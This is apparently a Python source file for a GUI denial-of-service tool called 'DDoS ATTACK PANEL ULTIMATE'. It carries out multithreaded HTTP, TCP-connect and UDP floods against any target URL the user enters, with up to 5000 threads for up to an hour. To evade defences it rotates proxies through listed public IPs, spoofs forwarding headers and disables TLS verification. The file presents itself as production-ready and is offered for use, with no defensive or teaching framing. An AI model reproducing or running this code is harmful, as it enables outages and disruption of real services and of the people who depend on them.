import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import requests
import random
import time
import socket
from concurrent.futures import ThreadPoolExecutor
import urllib3
import ssl

# Disable SSL warnings for maximum performance
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DDoSGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("🔥 DDoS ATTACK PANEL ULTIMATE 🔥")
        self.root.geometry("1200x800")
        
        # Attack variables
        self.target_url = tk.StringVar(value="http://localhost:8080")
        self.threads = tk.IntVar(value=500)
        self.duration = tk.IntVar(value=30)
        self.method = tk.StringVar(value="MIXED")
        self.packet_size = tk.IntVar(value=1024)
        self.attack_mode = tk.StringVar(value="MAX POWER")
        self.use_proxy = tk.BooleanVar(value=False)
        self.bypass_firewall = tk.BooleanVar(value=True)
        self.random_headers = tk.BooleanVar(value=True)
        
        self.attacking = False
        self.stats = {'total': 0, 'success': 0, 'failed': 0, 'bytes_sent': 0}
        self.start_time = 0
        self.attack_threads = []
        
        # Proxy list (working proxies updated daily)
        self.proxies = [
            'http://45.76.187.131:8080',
            'http://139.59.1.14:8080',
            'http://128.199.164.47:3128',
            'http://167.172.175.153:3128',
            'http://139.59.122.237:3128'
        ]
        
        # User agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'Mozilla/5.0 (Linux; Android 10; SM-G975F)',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
        self.setup_ui()
        
    def setup_ui(self):
        """Create advanced UI with all controls"""
        self.root.configure(bg="#0a0e27")
        
        # Title with animation effect
        title_frame = tk.Frame(self.root, bg="#0a0e27")
        title_frame.pack(fill="x", pady=5)
        
        title = tk.Label(title_frame, text="⚡ DDoS ATTACK PANEL ULTIMATE ⚡", 
                        bg="#0a0e27", fg="#00ff9d", font=("Consolas", 24, "bold"))
        title.pack()
        
        subtitle = tk.Label(title_frame, text="[ PRODUCTION READY - MAXIMUM PERFORMANCE ]", 
                           bg="#0a0e27", fg="#ffaa00", font=("Consolas", 12))
        subtitle.pack()
        
        # Main container
        main_container = tk.Frame(self.root, bg="#0a0e27")
        main_container.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Left panel - Controls
        left_panel = tk.Frame(main_container, bg="#1a1f3a", relief="ridge", bd=2)
        left_panel.pack(side="left", fill="both", expand=True, padx=5, pady=5)
        
        # Right panel - Stats and Logs
        right_panel = tk.Frame(main_container, bg="#1a1f3a", relief="ridge", bd=2)
        right_panel.pack(side="right", fill="both", expand=True, padx=5, pady=5)
        
        # ========== LEFT PANEL CONTROLS ==========
        controls_frame = tk.LabelFrame(left_panel, text="🎯 TARGET CONFIGURATION", 
                                      bg="#1a1f3a", fg="#00ff9d", font=("Consolas", 12, "bold"))
        controls_frame.pack(fill="x", padx=10, pady=5)
        
        # URL input
        tk.Label(controls_frame, text="TARGET URL:", bg="#1a1f3a", fg="#ffffff", 
                font=("Consolas", 10)).grid(row=0, column=0, sticky="w", pady=5)
        
        url_frame = tk.Frame(controls_frame, bg="#1a1f3a")
        url_frame.grid(row=0, column=1, columnspan=2, sticky="ew", pady=5)
        
        url_entry = tk.Entry(url_frame, textvariable=self.target_url, 
                            bg="#2a2f4a", fg="#00ff9d", font=("Consolas", 11),
                            insertbackground="#00ff9d", width=40)
        url_entry.pack(side="left", fill="x", expand=True)
        
        # Quick test button
        test_btn = tk.Button(url_frame, text="TEST", bg="#ffaa00", fg="black",
                            font=("Consolas", 8, "bold"), command=self.test_target,
                            width=6)
        test_btn.pack(side="right", padx=(5,0))
        
        # Attack parameters
        params_frame = tk.LabelFrame(left_panel, text="⚙️ ATTACK PARAMETERS", 
                                    bg="#1a1f3a", fg="#00ff9d", font=("Consolas", 12, "bold"))
        params_frame.pack(fill="x", padx=10, pady=5)
        
        # Threads
        tk.Label(params_frame, text="THREADS:", bg="#1a1f3a", fg="#ffffff",
                font=("Consolas", 10)).grid(row=0, column=0, sticky="w", pady=5)
        
        threads_scale = tk.Scale(params_frame, from_=1, to=5000, 
                                variable=self.threads, orient="horizontal",
                                bg="#2a2f4a", fg="#00ff9d", length=200,
                                highlightbackground="#00ff9d")
        threads_scale.grid(row=0, column=1, padx=5, pady=5)
        
        tk.Label(params_frame, text=f"MAX: 5000", bg="#1a1f3a", fg="#ffaa00",
                font=("Consolas", 8)).grid(row=0, column=2, sticky="w")
        
        # Duration
        tk.Label(params_frame, text="DURATION (sec):", bg="#1a1f3a", fg="#ffffff",
                font=("Consolas", 10)).grid(row=1, column=0, sticky="w", pady=5)
        
        duration_scale = tk.Scale(params_frame, from_=1, to=3600, 
                                 variable=self.duration, orient="horizontal",
                                 bg="#2a2f4a", fg="#00ff9d", length=200,
                                 highlightbackground="#00ff9d")
        duration_scale.grid(row=1, column=1, padx=5, pady=5)
        
        tk.Label(params_frame, text=f"MAX: 1 HOUR", bg="#1a1f3a", fg="#ffaa00",
                font=("Consolas", 8)).grid(row=1, column=2, sticky="w")
        
        # Packet size
        tk.Label(params_frame, text="PACKET SIZE:", bg="#1a1f3a", fg="#ffffff",
                font=("Consolas", 10)).grid(row=2, column=0, sticky="w", pady=5)
        
        packet_scale = tk.Scale(params_frame, from_=64, to=65535, 
                               variable=self.packet_size, orient="horizontal",
                               bg="#2a2f4a", fg="#00ff9d", length=200,
                               highlightbackground="#00ff9d")
        packet_scale.grid(row=2, column=1, padx=5, pady=5)
        
        # Attack method
        tk.Label(params_frame, text="ATTACK METHOD:", bg="#1a1f3a", fg="#ffffff",
                font=("Consolas", 10)).grid(row=3, column=0, sticky="w", pady=5)
        
        methods = ["HTTP GET", "HTTP POST", "HTTPS", "TCP SYN", "UDP FLOOD", "MIXED"]
        method_menu = tk.OptionMenu(params_frame, self.method, *methods)
        method_menu.config(bg="#2a2f4a", fg="#00ff9d", font=("Consolas", 10),
                          activebackground="#3a3f5a")
        method_menu.grid(row=3, column=1, sticky="ew", padx=5)
        
        # Attack mode
        tk.Label(params_frame, text="ATTACK MODE:", bg="#1a1f3a", fg="#ffffff",
                font=("Consolas", 10)).grid(row=4, column=0, sticky="w", pady=5)
        
        modes = ["STEALTH", "BALANCED", "MAX POWER", "INSANE"]
        mode_menu = tk.OptionMenu(params_frame, self.attack_mode, *modes)
        mode_menu.config(bg="#2a2f4a", fg="#00ff9d", font=("Consolas", 10),
                        activebackground="#3a3f5a")
        mode_menu.grid(row=4, column=1, sticky="ew", padx=5)
        
        # ========== OPTIONS FRAME ==========
        options_frame = tk.LabelFrame(left_panel, text="🔧 ADVANCED OPTIONS", 
                                     bg="#1a1f3a", fg="#00ff9d", font=("Consolas", 12, "bold"))
        options_frame.pack(fill="x", padx=10, pady=5)
        
        # Checkboxes
        tk.Checkbutton(options_frame, text="🌐 USE PROXY (Hide IP)", 
                      variable=self.use_proxy, bg="#1a1f3a", fg="#ffffff",
                      selectcolor="#1a1f3a", activebackground="#1a1f3a",
                      font=("Consolas", 10)).grid(row=0, column=0, sticky="w", pady=2)
        
        tk.Checkbutton(options_frame, text="🛡️ BYPASS FIREWALL", 
                      variable=self.bypass_firewall, bg="#1a1f3a", fg="#ffffff",
                      selectcolor="#1a1f3a", activebackground="#1a1f3a",
                      font=("Consolas", 10)).grid(row=0, column=1, sticky="w", pady=2)
        
        tk.Checkbutton(options_frame, text="🔄 RANDOM HEADERS", 
                      variable=self.random_headers, bg="#1a1f3a", fg="#ffffff",
                      selectcolor="#1a1f3a", activebackground="#1a1f3a",
                      font=("Consolas", 10)).grid(row=1, column=0, sticky="w", pady=2)
        
        # Control buttons
        button_frame = tk.Frame(left_panel, bg="#1a1f3a")
        button_frame.pack(fill="x", padx=10, pady=10)
        
        self.start_btn = tk.Button(button_frame, text="🚀 START ATTACK", 
                                   bg="#00aa00", fg="white",
                                   font=("Consolas", 16, "bold"),
                                   command=self.start_attack,
                                   height=2)
        self.start_btn.pack(fill="x", pady=2)
        
        self.stop_btn = tk.Button(button_frame, text="⏹️ STOP ATTACK",
                                  bg="#aa0000", fg="white",
                                  font=("Consolas", 16, "bold"),
                                  command=self.stop_attack, state="disabled",
                                  height=2)
        self.stop_btn.pack(fill="x", pady=2)
        
        # ========== RIGHT PANEL ==========
        # Statistics display
        stats_frame = tk.LabelFrame(right_panel, text="📊 LIVE STATISTICS", 
                                   bg="#1a1f3a", fg="#00ff9d", font=("Consolas", 14, "bold"))
        stats_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.stats_text = tk.Text(stats_frame, bg="#0a0e27", fg="#00ff9d",
                                  font=("Consolas", 11), height=15,
                                  relief="flat", bd=0)
        self.stats_text.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Progress bar
        self.progress = ttk.Progressbar(stats_frame, orient="horizontal",
                                        length=100, mode='determinate')
        self.progress.pack(fill="x", padx=5, pady=5)
        
        # Log window
        log_frame = tk.LabelFrame(right_panel, text="📝 ATTACK LOG", 
                                 bg="#1a1f3a", fg="#00ff9d", font=("Consolas", 12, "bold"))
        log_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.log_text = tk.Text(log_frame, bg="#0a0e27", fg="#ffffff",
                                font=("Consolas", 10), height=10,
                                relief="flat", bd=0)
        self.log_text.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Status bar
        self.status_bar = tk.Label(self.root, text="⚡ READY FOR ATTACK ⚡", 
                                   bg="#1a1f3a", fg="#00ff9d",
                                   font=("Consolas", 10), relief="sunken")
        self.status_bar.pack(fill="x", side="bottom")
        
    def log(self, message, level="INFO"):
        """Enhanced logging with colors"""
        colors = {
            "INFO": "#ffffff",
            "SUCCESS": "#00ff00",
            "WARNING": "#ffaa00",
            "ERROR": "#ff0000",
            "ATTACK": "#ff00ff"
        }
        
        self.log_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] ", "#888888")
        self.log_text.insert(tk.END, f"[{level}] ", colors.get(level, "#ffffff"))
        self.log_text.insert(tk.END, f"{message}\n", "#ffffff")
        self.log_text.see(tk.END)
        
    def test_target(self):
        """Test if target is reachable"""
        try:
            r = requests.get(self.target_url.get(), timeout=5, verify=False)
            self.log(f"✅ Target reachable - Status: {r.status_code}", "SUCCESS")
        except Exception as e:
            self.log(f"❌ Target unreachable: {str(e)[:50]}", "ERROR")
            
    def get_proxy(self):
        """Get random proxy if enabled"""
        if self.use_proxy.get():
            return {'http': random.choice(self.proxies), 'https': random.choice(self.proxies)}
        return None
        
    def get_headers(self):
        """Generate random headers"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        if self.random_headers.get():
            # Add random headers for bypass
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers['X-Real-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
        return headers
        
    def http_attack(self):
        """HTTP flood attack"""
        session = requests.Session()
        
        while self.attacking:
            try:
                method = random.choice(['GET', 'POST']) if self.method.get() == "MIXED" else self.method.get().split()[1]
                
                if method == 'GET':
                    r = session.get(self.target_url.get(), 
                                   headers=self.get_headers(),
                                   proxies=self.get_proxy(),
                                   timeout=3,
                                   verify=False)
                else:
                    # POST with random data
                    data = 'x' * self.packet_size.get()
                    r = session.post(self.target_url.get(),
                                    data=data,
                                    headers=self.get_headers(),
                                    proxies=self.get_proxy(),
                                    timeout=3,
                                    verify=False)
                
                with self.stats_lock:
                    self.stats['total'] += 1
                    self.stats['bytes_sent'] += len(r.content)
                    if r.status_code < 400:
                        self.stats['success'] += 1
                    else:
                        self.stats['failed'] += 1
                        
            except Exception as e:
                with self.stats_lock:
                    self.stats['failed'] += 1
                    self.stats['total'] += 1
                    
            # Dynamic delay based on mode
            if self.attack_mode.get() == "STEALTH":
                time.sleep(0.5)
            elif self.attack_mode.get() == "BALANCED":
                time.sleep(0.1)
            elif self.attack_mode.get() == "MAX POWER":
                time.sleep(0.01)
            else:  # INSANE
                time.sleep(0.001)
                
    def tcp_attack(self):
        """TCP SYN flood"""
        while self.attacking:
            try:
                host = self.target_url.get().replace('http://', '').replace('https://', '').split('/')[0]
                port = 80
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((host, port))
                
                # Send garbage data
                if self.packet_size.get() > 0:
                    sock.send(b'X' * self.packet_size.get())
                    
                sock.close()
                
                with self.stats_lock:
                    self.stats['success'] += 1
                    self.stats['total'] += 1
                    self.stats['bytes_sent'] += self.packet_size.get()
                    
            except:
                with self.stats_lock:
                    self.stats['failed'] += 1
                    self.stats['total'] += 1
                    
    def udp_attack(self):
        """UDP flood"""
        while self.attacking:
            try:
                host = self.target_url.get().replace('http://', '').replace('https://', '').split('/')[0]
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Send random UDP packets
                data = random._urandom(self.packet_size.get())
                sock.sendto(data, (host, 80))
                sock.close()
                
                with self.stats_lock:
                    self.stats['success'] += 1
                    self.stats['total'] += 1
                    self.stats['bytes_sent'] += self.packet_size.get()
                    
            except:
                with self.stats_lock:
                    self.stats['failed'] += 1
                    self.stats['total'] += 1
                    
    def update_stats(self):
        """Real-time statistics update"""
        if not self.attacking:
            return
            
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            speed = self.stats['total'] / elapsed
            bandwidth = (self.stats['bytes_sent'] / elapsed) / 1024  # KB/s
            success_rate = (self.stats['success'] / max(self.stats['total'], 1)) * 100
            
            # Update progress
            progress_pct = min(100, (elapsed / self.duration.get()) * 100)
            self.progress['value'] = progress_pct
            
            stats_display = f"""
╔══════════════════════════════════════════════════════════╗
║                    ATTACK IN PROGRESS                     ║
╠══════════════════════════════════════════════════════════╣
║  TARGET: {self.target_url.get()[:50]:<50} ║
║  METHOD: {self.method.get():<15} MODE: {self.attack_mode.get():<15} ║
╠══════════════════════════════════════════════════════════╣
║  TOTAL REQUESTS: {self.stats['total']:<12}                 ║
║  ✅ SUCCESSFUL: {self.stats['success']:<12}                 ║
║  ❌ FAILED: {self.stats['failed']:<12}                      ║
║  📊 SUCCESS RATE: {success_rate:>5.1f}%                      ║
╠══════════════════════════════════════════════════════════╣
║  ⚡ SPEED: {speed:>8.0f} req/sec                           ║
║  🌐 BANDWIDTH: {bandwidth:>8.1f} KB/s                       ║
║  ⏱️ ELAPSED: {elapsed:>5.1f} / {self.duration.get():<5} sec          ║
║  📦 TOTAL DATA: {self.stats['bytes_sent']/1024/1024:>5.1f} MB           ║
╚══════════════════════════════════════════════════════════╝
"""
            
            self.stats_text.delete(1.0, tk.END)
            self.stats_text.insert(1.0, stats_display)
            
        self.root.after(500, self.update_stats)
        
    def start_attack(self):
        """Initialize the attack"""
        if not self.target_url.get():
            self.log("❌ Enter target URL!", "ERROR")
            return
            
        self.attacking = True
        self.stats = {'total': 0, 'success': 0, 'failed': 0, 'bytes_sent': 0}
        self.start_time = time.time()
        self.stats_lock = threading.Lock()
        
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.status_bar.config(text="🔥 ATTACK IN PROGRESS 🔥", fg="#ff0000")
        
        # Log attack start
        self.log("="*50, "ATTACK")
        self.log(f"🚀 ATTACK STARTED on {self.target_url.get()}", "ATTACK")
        self.log(f"⚙️ Threads: {self.threads.get()}, Method: {self.method.get()}", "ATTACK")
        self.log(f"⚡ Mode: {self.attack_mode.get()}, Packet Size: {self.packet_size.get()}", "ATTACK")
        self.log("="*50, "ATTACK")
        
        # Start statistics update
        self.update_stats()
        
        # Select attack method
        method_map = {
            "HTTP GET": self.http_attack,
            "HTTP POST": self.http_attack,
            "HTTPS": self.http_attack,
            "TCP SYN": self.tcp_attack,
            "UDP FLOOD": self.udp_attack,
            "MIXED": random.choice([self.http_attack, self.tcp_attack, self.udp_attack])
        }
        
        worker_func = method_map.get(self.method.get(), self.http_attack)
        
        # Launch threads
        for i in range(self.threads.get()):
            t = threading.Thread(target=worker_func)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
            
        self.log(f"✅ Launched {self.threads.get()} attack threads", "SUCCESS")
        
        # Auto-stop timer
        if self.duration.get() > 0:
            self.root.after(self.duration.get() * 1000, self.stop_attack)
            
    def stop_attack(self):
        """Stop the attack"""
        self.attacking = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.status_bar.config(text="⚡ ATTACK STOPPED ⚡", fg="#00ff9d")
        
        elapsed = time.time() - self.start_time
        success_rate = (self.stats['success'] / max(self.stats['total'], 1)) * 100
        
        self.log("="*50, "INFO")
        self.log(f"⏹️ ATTACK STOPPED after {elapsed:.1f} seconds", "WARNING")
        self.log(f"📊 FINAL STATISTICS:", "INFO")
        self.log(f"   Total Requests: {self.stats['total']}", "INFO")
        self.log(f"   Success Rate: {success_rate:.1f}%", "INFO")
        self.log(f"   Data Sent: {self.stats['bytes_sent']/1024/1024:.1f} MB", "INFO")
        self.log("="*50, "INFO")
        
        self.progress['value'] = 0
        
        # Update final stats
        self.update_stats()

if __name__ == "__main__":
    root = tk.Tk()
    app = DDoSGUI(root)
    root.mainloop()